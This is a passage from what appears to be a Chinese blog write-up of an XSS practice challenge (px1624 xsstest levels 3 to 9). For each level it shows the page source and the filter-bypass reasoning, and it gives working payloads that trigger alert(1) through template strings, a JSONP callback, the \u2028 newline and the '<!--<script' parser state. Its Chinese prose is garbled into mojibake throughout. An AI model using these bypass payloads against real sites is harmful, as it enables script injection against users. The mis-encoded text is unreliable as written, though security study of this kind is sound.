</span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºæºç é‡Œçš„phpä»£ç æ²¡æœ‰æ˜¾ç¤ºï¼Œæ‰€ä»¥è¦çŒœå˜é‡åï¼Œè¿™é‡ŒçŒœå‡ºæ¥ç”¨çš„å˜é‡åæ—¶pxã€‚ç„¶åæˆ‘ä»¬ä¼ ä¸€ä¸ªpx=alert(1)ï¼Œè¿”å›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px = <span class="string">'alert(1)'</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'alert(1)'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°ä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²ï¼Œäºæ˜¯æˆ‘ä»¬ç”¨å¼•å·é—­åˆä¸¤è¾¹ï¼Œå†ç”¨è¿ç®—ç¬¦æ‹¼æ¥ä¸€ä¸‹å³åˆ»è§¦å‘å¼¹çª—</p><p>payload:<code>http://px1624.sinaapp.com/test/xsstest3/?px=%27-alert(1)-%27</code></p><p>è¿”å›ï¼š</p><p><img src="https://i.loli.net/2020/07/16/qIwr4jZ2Pa5btHR.png" alt="image-20200716174703421"></p><h4 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a></p><p>ç¬¬å››å…³åœ¨ç¬¬ä¸‰å…³çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†è¿ç®—ç¬¦ï¼Œä½†åœ¨jsä¸­ï¼Œinï¼Œinstanceofä¹Ÿå±äºè¿ç®—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸¤ä¸ªè¿›è¡Œç»•è¿‡</p><p>ä½†è¿™ä¸€é¢˜çš„é¢„æœŸè§£æ˜¯ç”¨çš„æ¨¡æ¿å­—ç¬¦ä¸²ã€‚</p><p>payload:<a href="http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/?px=%27;`;{alert</a>(%271</p><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/x8g6yJNVKd7Bujc.png" alt="image-20200716174741196"></p><p>ä¸¤æ¬¡åŒæ­¥è¾“å…¥å¯¼è‡´ä¸­é—´çš„ä»£ç éƒ½å˜æˆäº†æ¨¡æ¿å­—ç¬¦ä¸²ã€‚</p><h4 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass</a>~</p><p>è¿™ä¸€å…³è¿›å»å°±é‡å®šå‘åˆ°äº†user.phpï¼Œå‘ç°urlä¸Šæœ‰ä¸€ä¸ªcallbackå‚æ•°ï¼Œ</p><p>æºç åªæœ‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pre</span> <span class="attr">style</span>=<span class="string">"word-wrap: break-word; white-space: pre-wrap;"</span>&gt;</span>Give me xss bypass~<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¾“å…¥ç‚¹å°±æ˜¯callbackäº†ï¼Œè¾“å‡ºç‚¹åœ¨<code>&lt;pre&gt;</code>æ ‡ç­¾é—´ï¼Œ<code>&lt;pre&gt;</code>æ ‡ç­¾ä¸­çš„å…¶ä»–æ ‡ç­¾éƒ½ä¼šè¢«å®ä½“ç¼–ç ï¼Œæ‰€ä»¥è¿™é‡Œæ— æ³•é—­åˆæ ‡ç­¾ã€‚</p><p>ç„¶åå› ä¸ºæ˜¯é‡å®šå‘è¿‡æ¥çš„ï¼Œæ‰€ä»¥æŠŠé‡å®šå‘ç»™æ‹¦äº†å¯ä»¥çœ‹åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pagenum= $.Tjs_Get(<span class="string">'pn'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback=Give me xss bypass~"</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>');</span></span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 5~</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­Tjs_Getå‡½æ•°åœ¨index.jsä¸­ï¼Œä¸»è¦æ˜¯è·å–urlå‚æ•°ç”¨çš„ã€‚</p><p>æ‰€ä»¥payloadï¼š<code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/hKC5lJEaPs67kpr.png" alt="image-20200716174808888"></p><p>å› ä¸º<a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)è¿™ä¸ªæ–‡ä»¶å†…å®¹åªæœ‰alert(1)ï¼Œè¢«JSå¼•æ“è§£é‡Šæ‰§è¡Œåäºæ˜¯äº§ç”Ÿå¼¹çª—ã€‚" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)è¿™ä¸ªæ–‡ä»¶å†…å®¹åªæœ‰alert(1)ï¼Œè¢«JSå¼•æ“è§£é‡Šæ‰§è¡Œåäºæ˜¯äº§ç”Ÿå¼¹çª—ã€‚</a></p><h4 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest6" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6</a></p><p>ç›¸æ¯”ç¬¬äº”å…³ï¼Œå¯æ§çš„å‚æ•°åªæœ‰ä¸€ä¸ªäº†ï¼Œå°‘äº†é—®å·ï¼Œå¹¶ä¸”è¿‡æ»¤äº†é—®å·å’Œç™¾åˆ†å·ï¼Œè¿™å°±é˜»æ­¢äº†urlç¼–ç </p><p>è¿™é‡Œæ˜¯ç”¨çš„jsé‡Œæ›¿æ¢äº†%</p><p><img src="https://i.loli.net/2020/07/17/JlqyIudcxtnBbeV.png" alt="image-20200717132954073"></p><p>ä½†è¿™é‡ŒåŒ¹é…ï¼Ÿç”¨çš„æ˜¯æ­£åˆ™ï¼Œå’Œ.*ä¸€èµ·ï¼Œè€Œåœ¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">jsçš„æ­£åˆ™</a>é‡Œ ç‚¹ åŒ¹é…é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦ï¼Œå¹¶ä¸”åŒ¹é…åˆ°æ¢è¡Œç¬¦ä»¥åå°±ä¼šè¿”å›äº†ï¼Œä¸ä¼šç»§ç»­åŒ¹é…ä¸‹å»ã€‚æ‰€ä»¥æ¢è¡Œç¬¦åº”è¯¥å°±æ˜¯çªç ´ç‚¹äº†ï¼Œå¯æ˜¯åœ¨urlé‡Œæ¢è¡Œç¬¦å¾—ç”¨ç¼–ç %0aè¡¨ç¤ºï¼Œå¯%åˆè¢«è¿‡æ»¤äº†ï¼Œ<del>å¥—å¨ƒ?!</del>ã€‚è¿™é‡Œå‡ºé¢˜äººæŒ‡å‡ºï¼Œè¡¨ç¤ºæ¢è¡Œç¬¦å¹¶ä¸åª%0a,<a href="http://tools.jb51.net/table/javascript_escape" target="_blank" rel="noopener">è¿™é‡Œ</a>æŒ‡å‡ºæ¢è¡Œç¬¦è¿˜å¯ä»¥ç”¨\u000Aï¼Œ\u000Dï¼Œ\u2028å’Œ \u2029è¡¨ç¤º</p><p>äºæ˜¯æµ‹è¯•payload:<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/?#11?\u2028&amp;uin=../test/xsstest6/user.php?callback=alert()&quot;</code>ï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥åœ¨urlä¸Šè¾“å…¥ï¼Œä¸ç„¶\u2028ä¼šè¢«è®¤ä¸ºæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªèƒ½åœ¨æ§åˆ¶å°æ‰“ã€‚ç„¶è€Œæˆ‘ä¾æ—§æ²¡æœ‰æˆåŠŸï¼ˆä½œè€…åŸè¯ï¼šå¾—ç”¨è€ç‰ˆChromeæˆ–è€…IEï¼Œæ–°ç‰ˆçš„Chormeå¯¹location.hashçš„ç‰¹æ®Šå­—ç¬¦ä¹Ÿè¿›è¡Œäº†URLç¼–ç ï¼Œæ‰€ä»¥å¯¼è‡´\u2028å’Œ\u2029è¿™ç§æ¢è¡Œç¬¦çš„è§£æå¤±æ•ˆï¼Œä»è€Œä¸èƒ½ç”¨ã€‚)</p><p>æœ€åè¿™é‡Œç¬¬å…­å…³çš„user.phpè¿˜å¯¹å‚æ•°çš„å€¼çš„é•¿åº¦åšäº†è¦æ±‚ï¼Œåˆšå¥½æ— æ³•å¼¹1ï¼›</p><p>è¿™é‡Œç»•è¿‡çš„æ–¹æ³•ä¸€ä¸ªæ˜¯ç”¨ç¬¬äº”å…³çš„user.phpï¼Œå¦ä¸€ä¸ªæ–¹æ³•ï¼Œä½œè€…æ˜¯ç”¨çš„nameä¼ å‚ï¼Œåˆ©ç”¨iframeå»è¿™æ ·æ„é€ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">"px"</span> <span class="attr">name</span> = <span class="string">"&lt;img src=x onerror=alert(1)&gt;"</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElemntById(<span class="string">"px"</span>).src=<span class="string">"http://px1624.sinaapp.com/test/xsstest6/#?\u2028uin=../test/xsstest6/user.php?callback=$&#123;name&#125;"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest7" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7</a></p><p>è¾“å…¥ç‚¹æ˜¯pxï¼Œè¾“å‡ºç‚¹ä½äº<code>&lt;script&gt;</code>æ ‡ç­¾é—´ï¼Œä½†æ˜¯ä¼šå¯¹ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰ã€‚ç»æµ‹è¯•å¹¶æ²¡æœ‰å¯¹åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨åæ–œæ æŠŠå®ƒçš„åæ–œæ ç»™è¿‡æ»¤æ‰ï¼Œä»è€Œé€ƒé€¸å‡ºå•å¼•å·ï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?px=\'-alert(1)-</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">'\\'</span>-alert(<span class="number">1</span>)-<span class="string">';</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åé¢é‚£ä¸ªå•å¼•å·åˆ™æ²¡æœ‰åŠæ³•ï¼Œ</p><p>å› ä¸ºè¿™é‡Œä¹Ÿæœ‰åŒæ­¥è¾“å‡ºï¼Œæ‰€ä»¥æƒ³ç”¨ç¬¬å››é¢˜é‚£ç§æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œä¸€ä¸ªè¾“å‡ºåœ¨jsä¸­ï¼Œä¸€ä¸ªåœ¨htmlä¸­ï¼Œæ‰€ä»¥å¤±è´¥</p><p><img src="https://i.loli.net/2020/07/16/PtJAEofjhLVgknK.png" alt="image-20200715110011446"></p><p>è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾çš„ç‰¹æ€§</p><p>å‚è€ƒ<a href="https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019%2F10%2F25%2F5db1e6beea817/</a></p><p>HTML5è§£æå™¨åœ¨æ ‡ç­¾<code>&lt;script&gt;&lt;/script&gt;</code>ä¸­è§£æåˆ°<code>&lt;!--</code>æ—¶å€™ï¼Œä¼šè¿›å…¥åˆ°dash dash escaped stateï¼Œå“ªæ€•æ˜¯<code>&lt;script&gt;</code>å‡ºç°åœ¨jsçš„å­—ç¬¦ä¸²ä¸­ã€‚</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨scriptæ ‡ç­¾é‡Œå¦‚æœé‡åˆ°<code>&lt;!--</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªçš„è§£æä¼˜å…ˆçº§ä¼šå˜æˆæœ€é«˜ï¼Œå¦‚æœè¿™ä¸ªåé¢å†å‡ºç°<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œé‚£ä¹ˆæœ€è¿‘çš„å¦ä¸€ä¸ª<code>&lt;/script&gt;</code>æ ‡ç­¾å°±ä¼šä¼˜å…ˆå»é—­åˆè¿™ä¸ªã€‚</p><p>äºæ˜¯æˆ‘ä»¬è¾“å…¥<code>?px=&lt;!--&lt;script%20&gt;</code>ï¼Œå› ä¸º&gt;ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å‰é¢æ‰“ä¸€ä¸ªç©ºæ ¼ï¼Œ<code>&lt;!--&lt;script%20&gt;</code>è¢«è½¬ä¹‰ä¸º<code>\&lt;!--\&lt;script%20\&gt;</code>ï¼Œæ ¹æ®jsçš„ç‰¹æ€§ï¼Œè¿™ç­‰äº<code>\&lt;!--\&lt;script%20\=&#39;&#39;&gt;</code>,<code>\</code>è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå±æ€§äº†ï¼Œå€¼æ˜¯ç©ºï¼Œæ‰€ä»¥è¿™ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾è¢«è§£æã€‚</p><p>äºæ˜¯è¯¥å­—ç¬¦ä¸²ä¸‹æ–¹çš„<code>&lt;/script&gt;</code>åˆ™è¢«ç”¨æ¥é—­åˆæˆ‘ä»¬çš„è¾“å…¥</p><p><img src="https://i.loli.net/2020/07/16/hnTVeNfubr8o94q.png" alt="image-20200715111558811"></p><p>è¿™æ ·ä¸¤æ¬¡åŒæ­¥è¾“å‡ºéƒ½åœ¨jsä¸­äº†ï¼Œäºæ˜¯è¿™é‡Œä½¿ç”¨æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œç”¨è¿ç®—ç¬¦æ‹¼æ¥å­—ç¬¦ä¸²</p><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px<span class="number">1624</span>.sinaapp.com/test/xsstest<span class="number">7</span>/?px=\<span class="symbol">%27</span>-`-alert(<span class="number">1</span>)//<span class="symbol">%3</span>C<span class="title">!--</span><span class="symbol">%3</span>Cscript<span class="symbol">%20</span><span class="symbol">%3</span>E<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/REqsXPfg9U1n4ed.png" alt="image-20200715113149100"></p><h4 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest8/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest8/</a></p><p>ç¬¬å…«å…³è¾ƒç¬¬ä¸ƒå…³ï¼Œè¾“å…¥ç‚¹å¤šäº†ä¸€ä¸ªpx1624</p><p>åŒæ ·ä¹Ÿæ˜¯åŒæ­¥è¾“å‡ºï¼Œé™¤å»ä¸¤ä¸ªåœ¨<code>&lt;script&gt;</code>æ ‡ç­¾é‡Œçš„è¾“å‡ºç‚¹ï¼Œä¸€ä¸ªåœ¨<code>&lt;div&gt;</code>æ ‡ç­¾é—´ï¼Œä¸€ä¸ªæ˜¯<code>&lt;input&gt;</code>æ ‡ç­¾çš„valueå€¼ï¼Œä½†æ˜¯px1624çš„å€¼å°±æ˜¯pxçš„å€¼</p><p><img src="https://i.loli.net/2020/07/16/rtOI1X2A9Bk5jPw.png" alt="image-20200715113615191"></p><p>è¾“å‡ºç‚¹å‡ºç°åœ¨valueå¤„ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯é—­åˆåŒå¼•å·ï¼Œç„¶åç”¨onäº‹ä»¶è§¦å‘å¼¹çª—ï¼Œç„¶è€Œè¿™é‡Œå¯¹åŒå¼•å·åšäº†è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯è¦è·³å‡º<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œ</p><p>é¦–å…ˆç”¨    <code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3Cscript%20%3E</code>è·³å‡º</p><p><img src="https://i.loli.net/2020/07/16/RWcE7VvIfqmwk6T.png" alt="image-20200715133932290"></p><p>ä¸ªäººç†è§£ï¼šè¿™é‡Œç¬¬ä¸€ä¸ª<code>&lt;!--</code>é‡åˆ°äº†<code>&lt;script&gt;</code>ï¼Œéšåä¼˜å…ˆçº§å˜é«˜ï¼Œç´§è·Ÿç€ä¸‹é¢çš„é‚£ä¸ª<code>&lt;!--</code>å°±ç›´æ¥è¢«æ— è§†äº†ï¼Œç„¶åé‡åˆ°äº†ä¸‹é¢çš„<code>&lt;/script&gt;</code>ï¼Œç›´æ¥æ‹¿äº†è¿‡æ¥ï¼Œä¼˜å…ˆçº§å›è½ï¼Œç„¶åæœ€åä¸€è¡Œåˆå‡ºç°äº†<code>&lt;!--&lt;script &gt;</code>ï¼Œä½†æ˜¯åé¢å·²ç»æ²¡å†…å®¹äº†ï¼Œéšåæµè§ˆå™¨è¿›è¡ŒDOMæ¸²æŸ“ï¼Œ è¡¥ä¸Šäº†<code>&lt;/script&gt;</code>ã€‚</p><p>æœ€ç»ˆpayload:<code>http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3C/script%3E%3Cscript%20%3Ealert(1)%3C/script%3E</code></p><p>ä»¥<code>&lt;/script&gt;</code>å¼€å¤´ï¼Œåœ¨<code>&lt;!--</code>é‡åˆ°<code>&lt;script&gt;</code>åè¢«æå‡çš„ä¼˜å…ˆçº§å›è½åã€ä¼˜å…ˆçº§å›è½å‰ï¼Œé‡åˆ°çš„ç¬¬äºŒä¸ª<code>&lt;!--&lt;script&gt;</code>å¹¶ä¸èƒ½èµ·åˆ°ä½œç”¨ã€‘ï¼Œç«‹åˆ»é—­åˆæœ€å‰é¢çš„<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œéšåè‡ªå·±å†è¡¥ä¸Šä¸€ä¸ª<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>è¿›è¡Œå¼¹çª—ï¼Œè¿™é‡Œæ˜¯ç¬¬å››ä¸ªè¾“å‡ºç‚¹ï¼Œå¹¶æ²¡æœ‰è¢«ç¼–ç orè½¬ä¹‰ï¼Œæ•…å¼¹çª—æˆåŠŸã€‚</p><p>è¿”å›</p><p><img src="https://i.loli.net/2020/07/16/EYCP9AyfUVgzMSi.png" alt="image-20200715142513727"></p><h4 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h4><p><a href="http://px1624.sinaapp.com/test/xsstest9/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest9/</a></p><p>åŒæ ·å››ä¸ªè¾“å‡ºç‚¹ï¼Œä½†æ˜¯ä¸‹é¢éƒ½åšäº†ä¸€ä¸ªhtmlå®ä½“ç¼–ç ï¼Œå› æ­¤ç”¨ç¬¬å…«é¢˜çš„payloadæˆ‘ä»¬æ²¡æ³•ä¸»åŠ¨å»é—­åˆç¬¬ä¸€ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œæ›´æ²¡æ³•å¼¹çª—äº†</p><p><img src="https://i.loli.net/2020/07/16/VzUPbATemHGjlDq.png" alt="image-20200716140504739"></p><p>æ‰€ä»¥è¿™é‡Œçš„æ€è·¯ï¼Œåªè¦åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­å†™å…¥<code>alert(1)</code>å°±èƒ½å¼¹çª—äº†ï¼Œè¿™é‡Œåº”è¯¥è¦ç”¨åˆ°å­—ç¬¦ä¸²ä¸è¿ç®—ç¬¦é—´çš„æ‹¼æ¥ï¼Œç„¶åè¦åˆ©ç”¨åˆ°æ¨¡æ¿å­—ç¬¦ä¸²ã€‚å½“ç„¶ï¼Œç”¨<code>&lt;--ï¼</code>è·³å‡º<code>&lt;script&gt;</code>ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ä¸€ä¸ªæ­¥éª¤ã€‚ï¼ˆæ³¨æ„åˆ°ï¼Œå…¶å®ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªè¾“å‡ºç‚¹æ˜¯ç”±é•¿åº¦é™åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªé•¿åº¦é™åˆ¶æ¥è§£å†³ä¸€äº›é—®é¢˜ã€‚</p><p>æœ€ç»ˆçš„payloadï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//px</span>1624.sinaapp.com/test/xsstest9/?px=a\%27-&#123;a:<span class="string">`&#125;-alert(1)//`</span>&#125;-&#123;a:<span class="string">`$&#123;`</span>%3C!--%3Cscript%20%3E</span><br></pre></td></tr></table></figure><p>è¿”å›ï¼š</p><p><img src="https://i.loli.net/2020/07/16/uJTKMs1SYFhHUpz.png" alt="image-20200716145039824"></p><p>ä»ä¸‹é¢ä¸¤ä¸ªè¾“å‡ºç‚¹çœ‹èµ·çš„è¯å¯ä»¥å‘ç°ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹<code>/</code>è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥å¯ä»¥æ³¨é‡Šåé¢çš„ä¸€ä¸ªæ ‡ç­¾ã€‚ç„¶åç”±äºå¤šä½™çš„`éƒ½è¢«æˆªæ–­äº†ï¼Œè¿™é‡Œåˆšå¥½å‰©ä¸‹ä¸¤ä¸ªï¼Œå¯ä»¥ç”¨æ¥é—­åˆä¸Šé¢å¤šå‡ºæ¥çš„ã€‚è€Œä¸Šé¢è¿ç»­çš„ä¸¤ä¸ª`åˆ™ç”¨åµŒå¥—çš„æ–¹å¼éš”å¼€ã€‚ç”±äºåŒæ­¥è¾“å‡ºï¼Œæ‰€ä»¥ç¬¬ä¸€è¡ŒååŠéƒ¨åˆ†ä¹Ÿä¼šæœ‰ä¸¤ä¸ª`,ä¹Ÿæ­£å¥½å¯¹åº”å‰é¢ä¸¤ä¸ª`ã€‚</p><p>å¯¹äºæ„é€ æ­¥éª¤ï¼š</p><p>é¦–å…ˆæ˜¯æƒ³åœ¨å‰é¢ç‹¬ç«‹å‡ºä¸€ä¸ªalert(1)ï¼Œ</p><p><img src="https://i.loli.net/2020/07/16/BGZC1dE7pAlwoc9.png" alt="image-20200716152142498"></p><p>ç±»ä¼¼è¿™æ ·ï¼Œä½†è¿™éœ€è¦åé¢éƒ½è¢«æ¨¡æ¿å­—ç¬¦ä¸²åŒ…è£¹ï¼Œæµ‹è¯•è¿‡å¾ˆå¤šç§ï¼Œéƒ½æ²¡æœ‰æˆåŠŸå®ç°ã€‚</p><p>äºæ˜¯æƒ³ç€åœ¨æœ€åç‹¬ç«‹å‡ºä¸€ä¸ªalert(1)ï¼Œåé¢çš„æ ‡ç­¾å¯ä»¥æ³¨é‡Šæ‰ã€‚åˆå› 